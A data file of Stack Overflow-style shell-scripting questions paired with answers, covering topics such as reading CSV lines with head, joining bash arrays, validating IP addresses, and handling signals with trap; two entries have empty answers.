    "Read first x lines of csv file into new outfile?": "Brief\n(You'll use a linux terminal/console)\nUse head -n NUMBEROFLINES file.csv to get the first NUMBEROFLINES of lines. Write it into another file using shell redirection (>) like this:\nhead -n NUMBEROFLINES file.csv > mynewfile.csv\nNote that this will totally recreate mynewfile.csv, if it had any content before it is now deleted forever(-ish).\nIf you ever happen to want the opposite (last x lines), use tail.\nBoth tools come with man and info pages (man head or info head - get used to man, though) and a --help flag (head --help actually shows me more or less the man page).\nFull example\nhead -n 10 data.csv >> /tmp/first_and_last.csv # Note the \">>\"\ntail -n 10 data.csv >> /tmp/first_and_last.csv # Note the \">>\"\nThis would open the file /tmp/first_and_last.csv and attach (>>, > would recreate/delete the file!) the first and the last 10 lines of data.csv at the \"end\" of /tmp/first_and_last.csv.\nMac OS X: According to the internet (tm) these commands are available in (Unix-based) Mac OS as well (you have to start the Terminal via Finder).\nMore speaking examples\n-n is short for --lines=, so you could also use:\ntail --lines=10 data.csv >> addtothisfile.txt\nhead --lines=10 data.csv >> addtothisfile.txt",
    "Redirecting command output to a variable in bash fails": "Maybe the output goes to stderr, not stdout? Try this:\nOUTPUT=\"$(sudo apache2ctl configtest 2>&1)\"",
    "How do I make Jenkins 2.0 execute a sh command in the same directory as the checkout?": "",
    "^word^replacement^ on all matches in Bash?": "Try this:\n$ echo oneone\noneone\n$ !!:gs/one/two/    # Repeats last command; substitutes 'one' --> 'two'.\ntwotwo",
    "Invoke function whose name is stored in a variable in bash": "You should be able to just call the function directly using\n$call_func\nFor everything else check out that answer: https://stackoverflow.com/a/17529221/3236102 It's not directly what you need, but it shows a lot of different ways of how to call commands / functions.\nLetting the user execute any arbitrary code is bad practice though, since it can be quite dangerous. What would be better is to do it like this:\nif [ $userinput == \"some_command\" ];then\n    some_command\nfi\nThis way, the user can only execute the commands that you want them to and can even output an error message if the input was incorrect.",
    "\"Illegal option\" error when using find on macOS": "The first argument to find is the path where it should start looking. The path . means the current directory.\nfind . -type f -name '*R'\nYou must provide at least one path, but you can actually provide as many as you want:\nfind ~/Documents ~/Library -type f -name '*R'",
    "Sorting on the last field of a line": "awk '{print $NF,$0}' file | sort | cut -f2- -d' '\nBasically, this command does:\nRepeat the last field at the beginning, separated with a whitespace (default OFS)\nSort, resolve the duplicated filenames using the full path ($0) for sorting\nCut the repeated first field, f2- means from the second field to the last",
    "Get MAC address using shell script": "You can do as follows\nifconfig <Interface ex:eth0,eth1> | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}'\nAlso you can get the MAC address for all interfaces as follows\ncat /sys/class/net/*/address\nFor a particular interface like eth0\ncat /sys/class/net/eth0/address",
    "Extract version number from file in shell script": "$ v=1.2.13\n$ echo \"${v%.*}.$((${v##*.}+1))\"\n1.2.14\n$ v=11.1.2.3.0\n$ echo \"${v%.*}.$((${v##*.}+1))\"\n11.1.2.3.1\nHere is how it works:\nThe string is split in two parts.\nthe first one contains everything but the last dot and next characters: ${v%.*}\nthe second one contains everything but all characters up to the last dot: ${v##*.}\nThe first part is printed as is, followed by a plain dot and the last part incremented using shell arithmetic expansion: $((x+1))",
    "Extract directory path and filename": "Use the basename command to extract the filename from the path:\n[/tmp]$ export fspec=/exp/home1/abc.txt \n[/tmp]$ fname=`basename $fspec`\n[/tmp]$ echo $fname\nabc.txt",
    "Can't use nvm from bash script": "if you have nvm running on the main shell, you just need to add:\nexport NVM_DIR=$HOME/.nvm;\nsource $NVM_DIR/nvm.sh;\nin your script",
    "Best way to do a find/replace in several files?": "I'll throw in another example for folks using ag, The Silver Searcher to do find/replace operations on multiple files.\nComplete example:\nag -l \"search string\" | xargs sed -i '' -e 's/from/to/g'\nIf we break this down, what we get is:\n# returns a list of files containing matching string\nag -l \"search string\"\nNext, we have:\n# consume the list of piped files and prepare to run foregoing command\n# for each file delimited by newline\nxargs\nFinally, the string replacement command:\n# -i '' means edit files in place and the '' means do not create a backup\n# -e 's/from/to/g' specifies the command to run, in this case,\n# global, search and replace\n\nsed -i '' -e 's/from/to/g'",
    "Copy shell script output to clipboard": "That may depend on the environment you're using. With Gnome at least (I haven't tried the others but it may work), you can pipe your output as follows:\necho 123 | xclip\necho 123 | xclip -sel clip\nThe first goes to the mouse clipboard, the second to the \"normal\" clipboard.",
    "find and delete file or folder older than x days": "You can make use of this piece of code\nfind /tmp/* -mtime +7 -exec rm {} \\;\nExplanation\nThe first argument is the path to the files. This can be a path, a directory, or a wildcard as in the example above. I would recommend using the full path, and make sure that you run the command without the exec rm to make sure you are getting the right results.\nThe second argument, -mtime, is used to specify the number of days old that the file is. If you enter +7, it will find files older than 7 days.\nThe third argument, -exec, allows you to pass in a command such as rm. The {} \\; at the end is required to end the command.\nSource : http://www.howtogeek.com/howto/ubuntu/delete-files-older-than-x-days-on-linux/\nFor deleting folders, after emptying inside of them you can rmdirinstad of rm in the piece of code, also if you only want to see directories you can add\n-type d\nto piece of code such as below:\nfind /tmp/*/* -mtime +7 -type d -exec rmdir {} \\;",
    "how to run python script without typing 'python ...'": "You've got to add the shebang:\n#!/usr/bin/env python\nThen make the script executable:\nchmod +x foo\nThen you can run it like any other executable:\n./foo\nAnd a note from Homer6: if you're editing the file from windows and invoking it on linux, you may run into the cryptic \"No such file or directory\" error. It's due to the line endings of the lines being CRLF instead of LF. If you convert them to LF, the script will execute as expected. Notepad++ > View > Show Symbols > Show End of Line to show the EOL characters. And Notepad++ > Edit > EOL Conversion > Unix Format to convert all line endings to use LF. Alternatively, you can use the dos2unix tool (dos2unix foo.py), which is present on most Linux systems.",
    "Automatically chdir to vagrant directory upon \"vagrant ssh\"": "You can do this by using the config.ssh.extra_args setting in your Vagrantfile:\n  config.ssh.extra_args = [\"-t\", \"cd /vagrant; bash --login\"]\nThen anytime you run vagrant ssh you will be in the /vagrant directory.",
    "Shortest command to calculate the sum of a column of output on Unix?": "ipcs -mb | tail +4 | awk '{ sum += $7 } END { print sum }'\nOr without tail:\nipcs -mb | awk 'NR > 3 { sum += $7 } END { print sum }'\nUsing awk with bc to have arbitrary long results (credits to Jouni K.):\nipcs -mb | awk 'NR > 3 { print $7 }' | paste -sd+ | bc",
    "Saving awk output to variable [duplicate]": "#!/bin/bash\n\nvariable=`ps -ef | grep \"port 10 -\" | grep -v \"grep port 10 -\" | awk '{printf $12}'`\necho $variable\nNotice that there's no space after the equal sign.\nYou can also use $() which allows nesting and is readable.",
    "Write to custom log file from a Bash script": "logger logs to syslog facilities. If you want the message to go to a particular file you have to modify the syslog configuration accordingly. You could add a line like this:\nlocal7.*   -/var/log/mycustomlog\nand restart syslog. Then you can log like this:\nlogger -p local7.info \"information message\"\nlogger -p local7.err \"error message\"\nand the messages will appear in the desired logfile with the correct log level.\nWithout making changes to the syslog configuration you could use logger like this:\nlogger -s \"foo bar\" 2>> /var/log/mycustomlog\nSpecifying -s or --stderr instructs logger to print the message to STDERR as well (in addition to logging it to syslog), so you could redirect STDERR to a file. However, it would be utterly pointless, because the message is already logged via syslog anyway (with the default priority user.notice). Note that we use here 2>> to append standard error to the file named.",
    "Null & empty string comparison in Bash [duplicate]": "First of all, note you are not using the variable correctly:\nif [ \"pass_tc11\" != \"\" ]; then\n#     ^\n#     missing $\nAnyway, to check if a variable is empty or not you can use -z --> the string is empty:\nif [ ! -z \"$pass_tc11\" ]; then\n   echo \"hi, I am not empty\"\nfi\nor -n --> the length is non-zero:\nif [ -n \"$pass_tc11\" ]; then\n   echo \"hi, I am not empty\"\nfi\nFrom man test:\n-z STRING\nthe length of STRING is zero\n-n STRING\nthe length of STRING is nonzero\nSamples:\n$ [ ! -z \"$var\" ] && echo \"yes\"\n$\n\n$ var=\"\"\n$ [ ! -z \"$var\" ] && echo \"yes\"\n$\n\n$ var=\"a\"\n$ [ ! -z \"$var\" ] && echo \"yes\"\nyes\n\n$ var=\"a\"\n$ [ -n \"$var\" ] && echo \"yes\"\nyes",
    "if statement to check $HOSTNAME in shell script": "The POSIX and portable way to compare strings in the shell is\nif [ \"$HOSTNAME\" = foo ]; then\n    printf '%s\\n' \"on the right host\"\nelse\n    printf '%s\\n' \"uh-oh, not on foo\"\nfi\nA case statement may be more flexible, though:\ncase $HOSTNAME in\n  (foo) echo \"Woohoo, we're on foo!\";;\n  (bar) echo \"Oops, bar? Are you kidding?\";;\n  (*)   echo \"How did I get in the middle of nowhere?\";;\nesac",
    "Install Latest Stable Version of Ruby Using rbenv": "Simple solution (directly installs latest stable version):\nrbenv install $(rbenv install -l | grep -v - | tail -1)\nExplanation:\nrbenv install -l | grep -v - | tail -1\nFilters out all versions that contain a hyphen -, which is all non-MRI versions and prerelease MRI versions. Then selects the last one, guaranteed to be the highest because ruby-build output is already sorted by version number ascending.",
    "xargs split at newlines not spaces": "Try:\nprintf %b 'ac s\\nbc s\\ncc s\\n' | xargs -d '\\n' bash /tmp/test.sh\nYou neglected to quote the \\n passed to -d, which means that just n rather than \\n was passed to xargs as the delimiter - the shell \"ate\" the \\ (when the shell parses an unquoted string, \\ functions as an escape character; if an ordinary character follows the \\ - n in this case - only that ordinary character is used).\nAlso heed @glenn jackman's advice to double-quote the $@ inside the script (or omit the in \"$@\" part altogether).\nAlso: xargs -d is a GNU extension, which, for instance, won't work on FreeBSD/macOS. To make it work there, see @glenn jackman's xargs -0-based solution.\nNote that I'm using printf rather than echo to ensure that the \\n instances in the string are interpreted as newlines in all Bourne-like shells:\nIn bash and ksh[1], echo defaults to NOT interpreting \\-based escape sequences (you have to use -e to achieve that) - unlike in zsh and strictly POSIX-compliant shells such as dash.\nTherefore, printf is the more portable choice.\n[1] According to the manual, ksh's echo builtin exhibits the same behavior as the host platform's external echo utility; while this may vary across platforms, the Linux and BSD/macOS implementations do not interpret \\ escape sequences by default.",
    "How can I get the value from an attribute using xmllint and XPath?": "You need to use fn:string(), which will return the value of its argument as xs:string. In case its argument is an attribute, it will therefore return the attribute's value as xs:string.\ntest=$(xmllint --xpath \"string(//body/value/@name)\" test.xml)",
    "How to assign execute permission to a .sh file in windows to be executed in linux": "As far as I know the permission system in Linux is set up in such a way to prevent exactly what you are trying to accomplish.\nI think the best you can do is to give your Linux user a custom unzip one-liner to run on the prompt:\nunzip zip_name.zip && chmod +x script_name.sh\nIf there are multiple scripts that you need to give execute permission to, write a grant_perms.sh as follows:\n#!/bin/bash\n# file: grant_perms.sh\n\nchmod +x script_1.sh\nchmod +x script_2.sh\n...\nchmod +x script_n.sh\n(You can put the scripts all on one line for chmod, but I found separate lines easier to work with in vim and with shell script commands.)\nAnd now your unzip one-liner becomes:\nunzip zip_name.zip && source grant_perms.sh\nNote that since you are using source to run grant_perms.sh, it doesn't need execute permission",
    "Comparing two unsorted lists in linux, listing the unique in the second file": "grep -Fxv -f first-file.txt second-file.txt\nBasically looks for all lines in second-file.txt which don't match any line in first-file.txt. Might be slow if the files are large.\nAlso, once you sort the files (Use sort -n if they are numeric), then comm should also have worked. What error does it give? Try this:\ncomm -23 second-file-sorted.txt first-file-sorted.txt",
    "What's the easiest way to get a user's full name on a Linux/POSIX system?": "You don't specify a programming language, so I'll assume you want to use the shell; here's an answer for Posix shells.\nTwo steps to this: get the appropriate record, then get the field you want from that record.\nFirst, getting the account record is done by querying the passwd table:\n$ user_name=foo\n$ user_record=\"$(getent passwd $user_name)\"\n$ echo \"$user_record\"\nfoo:x:1023:1025:Fred Nurk,,,:/home/foo:/bin/bash\nFor hysterical raisins, the full name of the user is recorded in a field called the \u201cGECOS\u201d field; to complicate matters, this field often has its own structure with the full name as just one of several optional sub-fields. So anything that wants to get the full name from the account record needs to parse both these levels.\n$ user_record=\"$(getent passwd $user_name)\"\n$ user_gecos_field=\"$(echo \"$user_record\" | cut -d ':' -f 5)\"\n$ user_full_name=\"$(echo \"$user_gecos_field\" | cut -d ',' -f 1)\"\n$ echo \"$user_full_name\"\nFred Nurk\nYour programming language probably has a library function to do this in fewer steps. In C, you'd use the \u2018getpwnam\u2019 function and then parse the GECOS field.",
    "Number of non repeating lines - unique count": "You could try using uniq man uniq and do the following\nsort file | uniq -u | wc -l",
    "List file names based on a filename pattern and file content?": "Grep DOES NOT use \"wildcards\" for search \u2013 that's shell globbing, like *.jpg. Grep uses \"regular expressions\" for pattern matching. While in the shell '*' means \"anything\", in grep it means \"match the previous item zero or more times\".\nMore information and examples here: http://www.regular-expressions.info/reference.html\nTo answer of your question - you can find files matching some pattern with grep:\nfind /somedir -type f -print | grep 'LMN2011' # that will show files whose names contain LMN2011\nThen you can search their content (case insensitive):\nfind /somedir -type f -print | grep -i 'LMN2011' | xargs grep -i 'LMN20113456'\nIf the paths can contain spaces, you should use the \"zero end\" feature:\nfind /somedir -type f -print0 | grep -iz 'LMN2011' | xargs -0 grep -i 'LMN20113456'",
    "Is there a way to indicate the last n parameters in a batch file?": "%* will always expand to all original parameters, sadly. But you can use the following snippet of code to build a variable containing all but the first parameter:\nrem throw the first parameter away\nshift\nset params=%1\n:loop\nshift\nif [%1]==[] goto afterloop\nset params=%params% %1\ngoto loop\n:afterloop\nI think it can be done shorter, though ... I don't write these sort of things very often :)\nShould work, though.",
    "How to start Genymotion device with shell command?": "",
    "How to get the default shell": "You can use the following command:\necho $SHELL",
    "How can I convert an array into a comma separated string?": "There are a few ways to do this:\n1. Join directly with printf (via Charles Duffy\u2019s comment)\nprintf -v joined '%s,' \"${data[@]}\"\necho \"${joined%,}\"\nThe printf builtin implicitly joins arrays. You could print interactively like 3a below with a one-liner reading printf '%s,' \"${data[@]}\", but you'd be left with a trailing comma. (This method even works in POSIX shell, though you'd have to use $@ as your array since POSIX can't handle other array types).\n2. Change the $IFS field separator (via chepner\u2019s answer)\njoin_arr() {\n  local IFS=\"$1\"\n  shift\n  echo \"$*\"\n}\n\njoin_arr , \"${data[@]}\"\nThis redefines the field separator within just the scope of this function so when the $data array is automatically expanded, it uses the desired delimiter instead of the first value of the global $IFS or (if it's empty or undefined) space.\nThis could be done without a function, but there's some nastiness about preserving $IFS: Charles Duffy notes that reverting IFS=\"$OLD_IFS\" after temporarily reassigning it could evaluate to IFS=\"\", but if $IFS was previously undefined, that's different from unset IFS and while it's possible to tease those apart, this functional approach is far cleaner thanks to its use of local to limit $IFS\u2019s scope.\nThis solution only supports single-character delimiters. See #5 below for a similar function that supports delimiters of any length.\n3a. Loop through its contents (and print incrementally)\ndelim=\"\"\nfor item in \"${data[@]}\"; do\n  printf \"%s\" \"$delim$item\"\n  delim=\",\"\ndone\necho # add a newline\nIf other code in that loop involves an external call (or even sleep 0.1), you'll actually watch this build piece by piece, which can be helpful in an interactive setting.\n3b. Loop through its contents (and build a variable)\ndelim=\"\"\njoined=\"\"\nfor item in \"${data[@]}\"; do\n  joined=\"$joined$delim$item\"\n  delim=\",\"\ndone\necho \"$joined\"\n4. Save the array as a string and run replacement on it (note, the array must lack spaces*)\ndata_string=\"${data[*]}\"\necho \"${data_string//${IFS:0:1}/,}\"\n* This will only work if the first character of $IFS (space by default) does not exist in any of the array's items.\nThis uses bash pattern substitution: ${parameter//pattern/string} will replace each instance of pattern in $parameter with string. In this case, string is ${IFS:0:1}, the substring of $IFS starting at the beginning and ending after one character.\nZ Shell (zsh) can do this in one nested parameter expansion:\necho \"${${data[@]}//${IFS:0:1}/,}\"\n(Though Z Shell can also do this sort of thing more elegantly with its dedicated join flag in the form echo \"${(j:,:)data}\" as noted by @DavidBaynard in a comment below this answer.)\n5. Join with replacement in an implicit loop (via Nicholas Sushkin's answer to a duplicate question)\njoin_by() {\n  local d=\"${1-}\" f=\"${2-}\"\n  if shift 2; then\n    printf %s \"$f\" \"${@/#/$d}\"\n  fi\n}\n\njoin_by , \"${data[@]}\"\nThis is very similar to #2 above (via chepner), but it uses pattern substitution rather than $IFS and therefore supports multi-character delimiters. $d saves the delimiter and $f saves the first item in the array (I'll say why in a moment). The real magic is ${@/#/$d}, which replaces the beginning (#) of each array element with the delimiter ($d). As you don't want to start with a delimiter, this uses shift to get past not only the delimiter argument but also the first array element (saved as $f), which is then printed right in front of the replacement.\nprintf has an odd behavior when you give it extra arguments as we do here. The template (%s) only specifies that there will be one argument, so the rest of the arguments act as if it's a loop and they're all concatenated onto each other. Consider changing that key line to printf \"%s\\n\" \"$f\" \"${@/#/$d}\". You'll end up with a newline after each element. If you want a trailing newline after printing the joined array, do it with printf %s \"$f\" \"${@/#/$d}\" $'\\n' (we need to use the $'\u2026' notation to tell bash to interpret the escape; another way to do this would be to insert a literal newline, but then the code looks weird).",
    "How to split the contents of `$PATH` into distinct lines?": "echo \"$PATH\" | tr ':' '\\n'\nShould do the trick. This will simply take the output of echo \"$PATH\" and replaces any colon with a newline delimiter.\nAnd if you need it in a loop:\nfor dir in `echo \"$PATH\" | tr ':' '\\n'`; do\n    echo \"$dir\"\ndone\nNote that the quotation marks around $PATH prevents the collapsing of multiple successive spaces in the output of $PATH while still outputting the content of the variable.",
    "SPRINTF in shell scripting?": "In Bash:\nvar=$(printf 'FILE=_%s_%s.dat' \"$val1\" \"$val2\")\nor, the equivalent, and closer to sprintf:\nprintf -v var 'FILE=_%s_%s.dat' \"$val1\" \"$val2\"\nIf your variables contain decimal values with leading zeros, you can remove the leading zeros:\nval1=008; val2=02\nvar=$(printf 'FILE=_%d_%d.dat' $((10#$val1)) $((10#$val2)))\nor\nprintf -v var 'FILE=_%d_%d.dat' $((10#$val1)) $((10#$val2))\nThe $((10#$val1)) coerces the value into base 10 so the %d in the format specification doesn't think that \"08\" is an invalid octal value.\nIf you're using date (at least for GNU date), you can omit the leading zeros like this:\ndate '+FILE_%-m_%-d.dat'\nFor completeness, if you want to add leading zeros, padded to a certain width:\nval1=8; val2=2\nprintf -v var 'FILE=_%04d_%06d.dat' \"$val1\" \"$val2\"\nor with dynamic widths:\nval1=8; val2=2\nwidth1=4; width2=6\nprintf -v var 'FILE=_%0*d_%0*d.dat' \"$width1\" \"$val1\" \"$width2\" \"$val2\"\nAdding leading zeros is useful for creating values that sort easily and align neatly in columns.",
    "What is the Python equivalent of `set -x` in shell?": "You can use the trace module:\npython -m trace -t your_script.py\nThe command line above will display every line of code as it is executed.",
    "How do you run a .exe with parameters using vba's shell()?": "This works for me (Excel 2013):\nPublic Sub StartExeWithArgument()\n    Dim strProgramName As String\n    Dim strArgument As String\n\n    strProgramName = \"C:\\Program Files\\Test\\foobar.exe\"\n    strArgument = \"/G\"\n\n    Call Shell(\"\"\"\" & strProgramName & \"\"\" \"\"\" & strArgument & \"\"\"\", vbNormalFocus)\nEnd Sub\nWith inspiration from here https://stackoverflow.com/a/3448682.",
    "Why & How fish does not support POSIX?": "fish isn't and never tried to be compatible with POSIX sh.\nThis really just means that it's a separate language (like Java, Python or Ruby) rather than an implementation or extension of sh (like Bash, Dash and Ksh).\nObviously, just like you can't copy-paste Java snippets into a Python program, you can't copy-paste sh code into fish.\nIn practice, this means that when you search for things like \"how do I show the current git branch in my prompt\", you need to make sure you find fish answers because the sh ones won't work. Similarly, when books or instructions give commands to run, you may occasionally need to rewrite some of them manually (or open a bash shell and paste them there).\nWhether this matters is entirely up to you, so definitely give it a go.",
    "Selecting text in terminal without using the mouse": "You can use the screen application and enter copy mode with Ctrl+a, Esc. Start selecting text with Space and end selecting text with Space. Insert text with Ctrl+a, ]",
    "Trim last 3 characters of a line WITHOUT using sed, or perl, etc": "Here's an old-fashioned unix trick for removing the last 3 characters from a line that makes no use of sed OR awk...\n> echo 987654321 | rev | cut -c 4- | rev\n\n987654\nUnlike the earlier example using 'cut', this does not require knowledge of the line length.",
    "How to get the first column of every line from a CSV file?": "Try this:\n awk -F\",\" '{print $1}' data.txt\nIt will split each input line in the file data.txt into different fields based on , character (as specified with the -F) and print the first field (column) to stdout.",
    "Replace spaces with underscores via BASH": "You could try the following:\nstr=\"${str// /_}\"",
    "Check for IP validity": "If you're using bash, you can do a simple regex match for the pattern, without validating the quads:\n#!/usr/bin/env bash\n\nip=1.2.3.4\n\nif [[ $ip =~ ^[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+$ ]]; then\n  echo \"success\"\nelse\n  echo \"fail\"\nfi\nIf you're stuck with a POSIX shell, then you can use expr to do basically the same thing, using BRE instead of ERE:\n#!/bin/sh\n\nip=1.2.3.4\n\nif expr \"$ip\" : '[0-9][0-9]*\\.[0-9][0-9]*\\.[0-9][0-9]*\\.[0-9][0-9]*$' >/dev/null; then\n  echo \"success\"\nelse\n  echo \"fail\"\nfi\nNote that expr assumes that your regex is anchored to the left-hand-side of the string, so the initial ^ is unnecessary.\nIf it's important to verify that each quad is less than 256, you'll obviously require more code:\n#!/bin/sh\n\nip=${1:-1.2.3.4}\n\nif expr \"$ip\" : '[0-9][0-9]*\\.[0-9][0-9]*\\.[0-9][0-9]*\\.[0-9][0-9]*$' >/dev/null; then\n  for i in 1 2 3 4; do\n    if [ $(echo \"$ip\" | cut -d. -f$i) -gt 255 ]; then\n      echo \"fail ($ip)\"\n      exit 1\n    fi\n  done\n  echo \"success ($ip)\"\n  exit 0\nelse\n  echo \"fail ($ip)\"\n  exit 1\nfi\nOr perhaps even with fewer pipes:\n#!/bin/sh\n\nip=${1:-1.2.3.4}\n\nif expr \"$ip\" : '[0-9][0-9]*\\.[0-9][0-9]*\\.[0-9][0-9]*\\.[0-9][0-9]*$' >/dev/null; then\n  IFS=.\n  set $ip\n  for quad in 1 2 3 4; do\n    if eval [ \\$$quad -gt 255 ]; then\n      echo \"fail ($ip)\"\n      exit 1\n    fi\n  done\n  echo \"success ($ip)\"\n  exit 0\nelse\n  echo \"fail ($ip)\"\n  exit 1\nfi\nOr again, if your shell is bash, you could use a cumbersome regular expression for quad validation if you're not fond of arithmetic:\n#!/usr/bin/env bash\n\nip=${1:-1.2.3.4}\n\nre='^(0*(1?[0-9]{1,2}|2([0-4][0-9]|5[0-5]))\\.){3}'\n re+='0*(1?[0-9]{1,2}|2([\u200c0-4][0-9]|5[0-5]))$'\n\nif [[ $ip =~ $re ]]; then\n  echo \"success\"\nelse\n  echo \"fail\"\nfi\nThis could also be expressed in BRE, but that's more typing than I have in my fingers.\nAnd lastly, if you like the idea of putting this functionality ... in a function:\n#!/usr/bin/env bash\n\nip=${1:-1.2.3.4}\n\nipvalid() {\n  # Set up local variables\n  local ip=${1:-NO_IP_PROVIDED}\n  local IFS=.; local -a a=($ip)\n  # Start with a regex format test\n  [[ $ip =~ ^[0-9]+(\\.[0-9]+){3}$ ]] || return 1\n  # Test values of quads\n  local quad\n  for quad in {0..3}; do\n    [[ \"${a[$quad]}\" -gt 255 ]] && return 1\n  done\n  return 0\n}\n\nif ipvalid \"$ip\"; then\n  echo \"success ($ip)\"\n  exit 0\nelse\n  echo \"fail ($ip)\"\n  exit 1\nfi\nThere are many ways you could do this. I've shown you just a few.",
    "How to read the file content into a variable in one go?": "Process the lines inside the loop instead of after it. If you really need the file in a variable:\nvar=$(<file)",
    "parameter for shell scripts that is started with qsub": "Using the qsub -v option is the proper way:\nqsub -v par_name=par_value[,par_name=par_value...] script.sh\npar_name can be used as variable in the shell script.",
    "Division in script and floating-point": "You could use the bc calculator. It will do arbitrary precision math using decimals (not binary floating point) if you set increease scale from its default of 0:\n$ m=34\n$ bc <<< \"scale = 10; 1 - (($m - 20) / 34)\"\n.5882352942\nThe -l option will load the standard math library and default the scale to 20:\n$ bc -l <<< \"1 - (($m - 20) / 34)\"\n.58823529411764705883\nYou can then use printf to format the output, if you so choose:\nprintf \"%.3f\\n\" \"$(bc -l ...)\"",
    "How to pass argument with exclamation mark on Linux?": "You should be able to simply wrap things in single quotes in the shell.\n$ emailsender.py -u username -p 'pass!!'",
    "Syntax error near unexpected token 'then'": "There must be a space between if and [, like this:\n#!/bin/bash\n#test file exists\n\nFILE=\"1\"\nif [ -e \"$FILE\" ]; then\n  if [ -f \"$FILE\" ]; then\n     echo :\"$FILE is a regular file\"\n  fi\n...\nThese (and their combinations) would all be incorrect too:\nif [-e \"$FILE\" ]; then\nif [ -e\"$FILE\" ]; then\nif [ -e \"$FILE\"]; then\nThese on the other hand are all ok:\nif [ -e \"$FILE\" ];then  # no spaces around ;\nif     [    -e   \"$FILE\"    ]   ;   then  # 1 or more spaces are ok\nBtw these are equivalent:\nif [ -e \"$FILE\" ]; then\nif test -e \"$FILE\"; then\nThese are also equivalent:\nif [ -e \"$FILE\" ]; then echo exists; fi\n[ -e \"$FILE\" ] && echo exists\ntest -e \"$FILE\" && echo exists\nAnd, the middle part of your script would have been better with an elif like this:\nif [ -f \"$FILE\" ]; then\n    echo $FILE is a regular file\nelif [ -d \"$FILE\" ]; then\n    echo $FILE is a directory\nfi\n(I also dropped the quotes in the echo, as in this example they are unnecessary)",
    "Identifying received signal name in Bash": "(If you only have the number of a signal and want the name, kill -l $SIGNAL_NUM prints the name of a signal; you can avoid that by using the signal names instead of numbers in your call to trap as below.)\nThis answer says that there's no way to access the signal name, but if you have a separate function for each signal that you trap, then you already know the signal name:\ntrap 'echo trapped the HUP signal' HUP\ntrap 'echo different trap for the INT signal' INT\nIn many cases, that may be sufficient, but another answer on that same question uses that fact to provide a workaround to fake the behavior you want. It takes a function and a list of signals and sets a separate trap for each signal on that function called with the signal name, so internally it's actually a separate function for each signal but it looks like a single trap on a single function that gets the signal name as an argument:\nCode:\n#!/bin/bash\n\ntrap_with_arg() {\n    func=\"$1\" ; shift\n    for sig ; do\n        trap \"$func $sig\" \"$sig\"\n    done\n}\n\nfunc_trap() {\n    echo \"Trapped: $1\"\n}\n\ntrap_with_arg func_trap INT TERM EXIT\n\necho \"Send signals to PID $$ and type [enter] when done.\"\nread # Wait so the script doesn't exit.\nIf I run that, then I can send signals to the process and I get output like\nTrapped: INT\nTrapped: TERM\nTrapped: EXIT",
    "What does if [ $? -eq 0 ] mean for shell scripts? [duplicate]": "$? is the exit status of the most recently-executed command; by convention, 0 means success and anything else indicates failure. That line is testing whether the grep command succeeded.\nThe grep manpage states:\nThe exit status is 0 if selected lines are found, and 1 if not found. If an error occurred the exit status is 2. (Note: POSIX error handling code should check for '2' or greater.)\nSo in this case it's checking whether any ERROR lines were found.",
    "Install zsh without root access? [closed]": "Download zsh with:\nwget -O zsh.tar.xz https://sourceforge.net/projects/zsh/files/latest/download\nmkdir zsh && unxz zsh.tar.xz && tar -xvf zsh.tar -C zsh --strip-components 1\ncd zsh\nYou can compile zsh yourself, for example:\n./configure --prefix=$HOME\nmake\nmake install\nand then start it explicitly, or programmatically from your current shell's startup file (put exec $HOME/bin/zsh -l in the right spot).",
    "Shell cmd \"date\" without new line in the end": "No there isn't. You need another command like echo -n, printf or tr. You could put a script somewhere in your PATH (eg. /usr/bin/) and make it executable with chmod +x /usr/bin/mydate\nscript:\n#!/bin/sh\necho -n `date +\"[%m-%d %H:%M:%S]\"`\nor use an alias.\nalias mydate=\"echo -n `date +\"[%m-%d %H:%M:%S]\"`\"",
    "tmux open terminal failed: not a terminal": "There is an answer already here, but this link I think summarises it better. In a nutshell, use the -t flag:\nssh -t host tmux attach\nIf you want to set it into your .ssh/config file, look in the ssh_config manpage for the RequestTTY option:\n RequestTTY\n         Specifies whether to request a pseudo-tty for the session.  The\n         argument may be one of: ``no'' (never request a TTY), ``yes''\n         (always request a TTY when standard input is a TTY), ``force''\n         (always request a TTY) or ``auto'' (request a TTY when opening a\n         login session).  This option mirrors the -t and -T flags for\n         ssh(1).",
    "Is it necessary to specify traps other than EXIT?": "I think trap 0 is executed just prior to script termination in all cases, so is useful for cleanup functionality (like removing temporary files, etc). The other signals can have specialized error handling but should terminate the script (that is, call exit).\nWhat you have described, I believe, would actually execute cmd twice. Once for the signal (for example SIGTERM) and once more on exit (trap 0).\nI believe the proper way to do this is like the following (see POSIX specification for trap):\ntrap \"rm tmpfile\" 0\ntrap \"exit 1\" TERM HUP ... \nThis ensures a temporary file is removed upon script completion, and lets you set custom exit statuses on signals.\nNOTE: trap 0 is called whether a signal is encountered or not.\nIf you are not concerned with setting an exit status, trap 0 would be sufficient.",
    "Execute a command in command prompt using excel VBA": "The S parameter does not do anything on its own.\n/S      Modifies the treatment of string after /C or /K (see below) \n/C      Carries out the command specified by string and then terminates  \n/K      Carries out the command specified by string but remains  \nTry something like this instead\nCall Shell(\"cmd.exe /S /K\" & \"perl a.pl c:\\temp\", vbNormalFocus)\nYou may not even need to add \"cmd.exe\" to this command unless you want a command window to open up when this is run. Shell should execute the command on its own.\nShell(\"perl a.pl c:\\temp\")\n\n\n-Edit-\nTo wait for the command to finish you will have to do something like @Nate Hekman shows in his answer here\nDim wsh As Object\nSet wsh = VBA.CreateObject(\"WScript.Shell\")\nDim waitOnReturn As Boolean: waitOnReturn = True\nDim windowStyle As Integer: windowStyle = 1\n\nwsh.Run \"cmd.exe /S /C perl a.pl c:\\temp\", windowStyle, waitOnReturn",
    "get last line from grep search on multiple files": "for f in $(find . -name \"FILE_NAME\"); do grep PATTERN $f | tail -1; done",
